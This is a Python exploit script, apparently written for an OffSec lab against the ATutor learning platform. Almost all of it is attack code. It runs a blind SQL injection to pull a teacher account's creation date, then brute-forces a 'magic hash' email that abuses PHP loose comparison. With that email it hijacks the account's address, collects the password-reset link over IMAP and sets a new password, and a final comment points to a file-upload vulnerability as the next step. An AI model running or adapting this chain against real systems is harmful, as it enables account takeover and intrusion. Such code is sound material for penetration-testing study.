import sys
import urllib.parse
sys.path.append('..')
import re

import asyncio
from lib.mysqli_template_async import get_string
from lib.mysqli_template_async import get_length

from lib.read_email import get_imap
from lib.read_email import get_messages

import hashlib, string, itertools, re, sys, requests
import netifaces as ni

from io import BytesIO
try:
    import uvloop
    uvloop.install()
except:
    pass

def gen_magic_email(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase,repeat=int(prefix_length))):
        words_combined = F"{word}@{domain}{date}{id}"#"%s@%s" % (word, domain) + date + id
        hash = hashlib.md5(words_combined.encode("latin1")).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print(F"(+) Found a valid email! {word}@{domain}")
            print(F"(+) Requests made: {count}")
            print(F"(+) Equivalent loose comparison: {hash} == 0" )
            return F"{word}@{domain}"
        count += 1
    return ''
def parse_msg_links(msg_links):
    pass

async def main():
    # 1. use sqli to exfil teacher account creation date
    blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
    url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
    conditional_error = lambda response: int(response.headers['Content-Length']) == 180
    query_encoder = lambda s: s.replace(' ','/**/')
    acct_query = "select creation_date from AT_members where member_id=1"
    acct_strlen = await get_length(url, base_query=blind_sqli_truthy, sub_query=acct_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    acct_creation_date = await get_string(url=url, base_query=blind_sqli_truthy, sub_query=acct_query, response_truth_condition=conditional_error, strlen=acct_strlen, query_encoder=query_encoder)
    print(F"(+) Teacher account creation date: {acct_creation_date}")
    # 2. gen email
    magic_email = gen_magic_email('offsec.local', "1", acct_creation_date, 3) 
    # 3. reset email to magic email
    url = F"http://atutor/ATutor/confirm.php?e={magic_email}&m=0&id=1"
    print (F"(*) Issuing update request to URL: {url}" )
    res = requests.get(url, allow_redirects=False)
    if (res.status_code == 302):
        print("(+) Email change successful")
    else:
        ("(-) Error resetting email address")
        exit(1)
    # 4. Get a password reset link
    pw_reset_url='http://atutor/ATutor/password_reminder.php'
    pw_reset_params = {"form_password_reminder": "true", "form_email": magic_email, "submit": "Submit"}
    res = requests.post(pw_reset_url, data=pw_reset_params, allow_redirects=False)
    #res = requests.post(pw_reset_url, data=pw_reset_params,, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
    if (res.status_code == 302):
        print("(+) Trigger password reset success")
    else:
        ("(-) Error Triggering password reset")
        exit(1)
    # 5. get reset link from atmail email
    pw_reset_url='http://atutor/ATutor/password_reminder.php'
    pw_reset_params = {"form_password_reminder": "true", "form_email": magic_email, "submit": "Submit"}
    imap_client = get_imap("atmail")
    imap_client.login(magic_email, '123456')
    msgs = get_messages(imap_client,'inbox')
    links_expr = r"(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’]))"
    pw_reset_link = ''
    reset_link_found = False
    for msg in msgs:
        if reset_link_found == True:
            break
        msg_links = re.findall(links_expr, msg['body'])
        for link in msg_links:
            if 'http://atutor/ATutor/password_reminder.php' in link[0]:
                pw_reset_link = link[0]
                reset_link_found = True
                break
    print(F"(+) Got pwd reset link: {pw_reset_link}")
    # 6. change password
    #pw_reset_url='http://atutor/Atutor/password_reminder.php'
    params = pw_reset_link.split('?')[1]
    #print(params)
    params_dict = urllib.parse.parse_qs(params)
    #print(params_dict)
    pw_unhashed = 'donkey123'
    password =  hashlib.sha1(pw_unhashed.encode('utf-8')).hexdigest()
    pw_reset_params = {"form_change": "true", "id": F"{params_dict['id'][0]}", "g": F"{params_dict['g'][0]}", "h": F"{params_dict['h'][0]}", "form_password_hidden": F"{password}", "password_error": '', "password": '', "password2": '', "submit": "Submit"}
    #print(pw_reset_params)
    pw_reset_url='http://atutor/Atutor/password_reminder.php'
    res = requests.post(pw_reset_link, data=pw_reset_params, allow_redirects=False)
    #res = requests.post(pw_reset_link, data=pw_reset_params,, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
    if (res.status_code == 302):
        print("(+) Password reset success")
        print(F"(+) Password reset to {pw_unhashed}")
    else:
        ("(-) Error resetting password")
        exit(1)
    # this is another post request that returns a 302 response.
    # 7. login and reuse file upload vuln
if __name__ == "__main__":
    try:
        asyncio.run(main())
    # https://github.com/MagicStack/uvloop/issues/349
    except NotImplementedError:
        pass















